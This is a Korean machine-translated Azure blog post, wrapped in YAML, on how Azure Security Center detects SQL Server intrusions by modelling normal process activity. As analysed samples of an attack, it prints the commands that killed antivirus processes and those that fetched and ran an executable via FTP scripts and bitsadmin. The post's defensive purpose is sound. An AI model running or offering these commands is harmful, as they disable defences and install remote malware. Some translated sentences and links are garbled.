### YamlMime:Yaml
ms.openlocfilehash: 52117bcfc7c4ceaf8f7134ec4617efd8658dd26c
ms.sourcegitcommit: d03bdc7fe5447adb6530886aab848b75fe8fa8ee
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 03/11/2022
ms.locfileid: "139911855"
Slug: how-azure-security-center-automates-the-detection-of-cyber-attack
Title: Azure Security Center에서 사이버 공격 탐지를 자동화하는 방법
Summary: 올해 초 그렉 코팅엄은 azure Security Center가 SQL Server 대한 공격을 감지한 예를 분석하는 훌륭한 기사를 작성했습니다. 이 게시물에서 우리는 그 방법에 대한 자세한 내용으로 이동 ...
Content: >-
  <p>올해 초, 그렉 코팅엄은 <a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/" target="_blank">azure Security Center가 SQL Server 대한 공격을 감지한</a> 예를 분석하는 훌륭한 기사를 작성했습니다. 이 게시물에서는 security Center가 대규모 데이터를 분석하여 이러한 유형의 공격을 감지하는 방법과 이러한 방법의 출력을 사용하여 몇 가지 일반적인 기술을 공유하는 다른 침입으로 피벗하는 방법에 대해 자세히 설명할&#39;있습니다.</p>


  <p>공격 기술이 빠르게 진화하면서 많은 조직에서 속도를 유지하기 위해 고군분투하고 있습니다. 이는 보안 인재의 부족으로 인해 악화되며, 기업은 더 이상 인간이 작성한 탐지에만 의존할 수 없습니다. 알고리즘 내에서 인간 보안 분석가의 직관을 굽는 방식으로 Azure Security Center는 변화하는 공격 패턴에 자동으로 적응할 수 있습니다.</p>


  <p>보안 센터에서 이 접근 방식을 사용하여 SQL Server 대한 공격을 감지하는 방법을 살펴보겠습니다&rsquo;. MSSQLSERVER 계정에서 실행되는 프로세스를 분석하면 거의 항상 고정된 작업 집합을 수행하는 정상적인 상황에서 &ndash; 매우 안정적입니다. 이 계정의 안정성을 통해 공격이 발생할 때 발생하는 비정상적인 활동을 감지하는 모델을 빌드할 수 있습니다.</p>


  <h2>모델 작성</h2>


  <p>Security Center는 이 데이터의 모델을 생성하기 전에 몇 가지 사전 처리를 수행하여 유사한 디렉터리가 부족한 프로세스 실행을 축소합니다. 그렇지 않으면 모델은 이러한 프로세스를 다른 프로세스로 볼 수 있습니다. 프로세스 디렉터리를 통해 클러스터에 대한 거리 함수를 사용한 다음 프로세스 이름이 공유되는 집계 보급을 사용합니다. 이 프로세스의 예는 아래에서 확인할 수 있습니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/e3c90311-f9ef-4000-9215-d15b526999a0.png"><img alt="acs-1" border="0" height="141" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/9e487a53-bf75-44a4-b916-d58aba0e4813.png" style="border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="acs-1" width="640"></a></p>


  <p>요약된 단일 상태로 줄일 수 있습니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/c76e0d3b-2c52-4209-85fd-c260ce03fe01.png"><img alt="acs-2" border="0" height="52" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/e6efcc26-308b-4794-8b4b-603d8f9da496.png" style="border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="acs-2" width="640"></a></p>


  <p>또한 데이터를 조작하여 regsvr32.exe 및 rundll32.exe 같은 호스트된 실행을 캡처합니다. 이 실행은 그 자체로 일반적일 수 있지만 다른 파일을 실행하는 데 사용할 수 있습니다. 실행된 파일을 자체적으로 실행으로 처리하면 이 메커니즘에서 실행된 모든 코드에 대한 인사이트를 얻을 수 있습니다.</p>


  <p>이 정규화된 데이터를 사용하여 Azure Security Center 검색 엔진은 구독에서 MSSQLSERVER에 의해 실행되는 프로세스의 보급을 그릴 수 있습니다. 이 계정의 안정성으로 인해 이 간단한 방법은 프로세스 이름 및 위치에 따라 정상적인 동작의 강력한 모델을 생성합니다. 이 모델의 시각화는 아래 그래프에서 볼 수 있습니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/389dce9c-0914-4441-aea9-443be728bb6d.png"><img alt="acs-3" border="0" height="324" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/c9764bd2-4d2d-473a-8d9d-fbe9ef4bdaa9.png" style="border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="acs-3" width="640"></a></p>


  <h2>변칙 찾기</h2>


  <p>SQL Server 같은 공격 표면이 표적으로 삼으면 공격자&rsquo;는 처음 몇 가지 작업이 매우 제한됩니다. 프로세스 실행 이벤트의 흔적을 남기는 다양한 전술을 시도할 수 있습니다. 아래 예제에서는 보안 센터에서 SQL Server 공격이 발생한 시점에 구독의 데이터를 사용하여 빌드한 동일한 모델을 보여 줍니다. 이번에는 몇 가지 흥미로운 데이터가 포함된 낮은 보급 실행의 꼬리에서 변칙을 찾습니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/10d93899-ef87-4e38-877b-d8390eab7742.png"><img alt="acs-4" border="0" height="377" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/e77819d6-c256-4966-bf5a-0f4a0b65b03e.png" style="border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="acs-4Let" width="640"></a>&#39;모델에서 식별된 비정상적인 실행 중 일부를 자세히 살펴봅니다.</p>


  <pre>

  taskkill  /im 360rp.exe /f

  taskkill  /im 360sd.exe /f

  taskkill  /im 360rps.exe /f

  ntsd -c q -pn 360rp.exe

  ntsd -c q -pn 360sd.exe

  ntsd -c q -pn 360rps.exe</pre>


  <p>첫 번째 단계에서는 호스트에서 실행되는 바이러스 백신 엔진을 사용하지 않도록 설정하는 몇 가지 시도가 표시됩니다. 첫 번째는 기본 제공 도구를 <code>taskkill</code> 사용하여 프로세스를 종료합니다. 두 번째는 디버거, &lsquo;ntsd&rsquo; 를 사용하여 pn 인수로 &ndash;중단하려는 프로세스에 연결하고, 대상에 성공적으로 연결되면 명령 &lsquo;q&rsquo; 를 실행합니다. &lsquo;q&rsquo; 명령을 사용하면 디버거가 대상 애플리케이션을 종료합니다.</p>


  <p>바이러스 백신 엔진을 사용하지 않도록 설정하면 공격자는 인터넷에서 첫 번째 단계를 무료로 다운로드하고 실행할 수 있습니다. 이 작업은 다음과 같은 몇 가지 방법으로 수행합니다.</p>


  <p>첫 번째는 FTP 프로토콜을 통한 것입니다. 공격자가 echo 명령을 사용하여 일련의 FTP 명령을 파일에 쓰는 것을 볼 수 있습니다.</p>


  <pre>

  echo open xxx.xxx.xxx.xxx&gt;So.2

  echo 111&gt;&gt;So.2

  echo 000&gt;&gt;So.2

  echo get Svn.exe &gt;&gt;So.2

  echo bye</pre>


  <p>그런 다음 명령이 실행됩니다.</p>


  <pre>

  ftp -s:So.2</pre>


  <p>파일이 삭제되고 실행 파일이 실행됩니다.</p>


  <pre>

  del So.2

  Svn.exe</pre>


  <p>실행 파일을 다운로드하는 이 방법이 실패하는 경우 공격은 HTTP를 통해 이번에는 동일한 주소에서 파일을 가져오는 보조 메커니즘으로 돌아갑니다.</p>


  <pre>

  bitsadmin  /transfer n <a href=""></a> c:\Users\Public\Svn.exe&quot;</pre>


  <p>여기서는 공격자가 도구를</a> 사용하여 인터넷에서 실행 파일을 다운로드하는 것을 <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa362813(v=vs.85).aspx" target="_blank"><code>bitsadmin</code> 볼 수 있습니다.</p>


  <p>Azure Security Center는 기계 학습을 사용하여 전문가 지식이나 사람의 개입 없이 이와 &ndash; 같은 비정상적인 활동에 대해 경고합니다. Azure Security Center 내에서 이러한 경고 중 하나가 표시되는 방법은 다음과 같습니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/17bb2814-6056-44f9-885e-ef755176695e.png"><img alt="acs-5" border="0" height="480" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/2434d6af-b15f-4340-a351-a663a0c720ff.png" style="border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="acs-5" width="566"></a></p>


  <h2>출력 마이닝</h2>


  <p>이 방법은 매우 구체적인 시나리오에서 공격을 검색하는 것으로 제한되지만, 공격자가 사용하는 새로운 기술의 검색을 자동화하는 탐지 팩터리 역할을 합니다.<br>

  &nbsp;<br>

  &rsquo;예제를 다시 살펴보겠습니다.<code>bitsadmin</code><br>

  &nbsp;<br>

  <code>bitsadmin&nbsp; /transfer n <a href=""></a> c:\Users\Public\xxx.exe&quot;</code><br>

  &nbsp;<br>

  자세히 살펴보면 공격자가 운영 체제의 기본 제공 기능을 사용하여 원격 파일을 실행하는 데 사용할 수 있는 일반적인 기술처럼 보이지만 보안 전문가가 아닌 알고리즘에 의해 표시됩니다.</p>


  <p>합법적인 사용 <code>bitsadmin</code> 은 일반적이지만 원격 위치, 작업 이름 및 실행 파일의 대상 디렉터리가 의심스럽습니다. 이는 MSSQLSERVER 계정에서 실행되는지 여부와 관계없이 특히 비정상적인 <code>bitsadmin</code> 실행을 대상으로 하는 새로운 검색의 기초를 제공합니다.<br>

  &nbsp;<br>

  <code>bitsadmin</code> 따라서 이 접근 방식에서 생성된 다른 경고는 독립 실행형 검색 기회로 적합성을 위해 채굴될 수 있습니다. 또한 다른 공격 벡터에서 몇 가지 일반적인 기술을 공유하는 구독에서 발생하는 다른 공격에 대해 고객에게 경고합니다.</p>


  <h2>요약</h2>


  <p>Azure Security Center를 사용하면 SQL Server 배포를 사용하는 고객은 검색에 대한 이 접근 방식의 이점을 자동으로 활용할 수 있습니다. 변칙 기반이기 때문에 변화하는 전술에 적응하여 인간 전문가의 개입 없이 새로운 공격을 경고합니다. 이 접근 방식에서 캡처한 새로운 기술은 모든 보안 센터 고객을 보호하기 위한 피드백인 검색 기회를 생성합니다.</p>


  <p>이 문서에 언급된 공격 유형 및 이를 완화하는 방법에 대한 자세한 내용은 블로그, &quot;<a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/" target="_blank">Azure Security Center에서 사이버 공격을 공개하는 방법을</a> 참조하세요.&quot;</p>


  <p>Azure Security Center의 검색에 대한 자세한 내용은 다음을 참조하세요.</p>


  <ul>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-detection-capabilities" target="_blank">Azure Security Centers&rsquo; 검색 기능</a></li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-managing-and-responding-alerts" target="_blank">Azure Security Center에서 보안 경고 관리 및 대응</a></li>
  </ul>
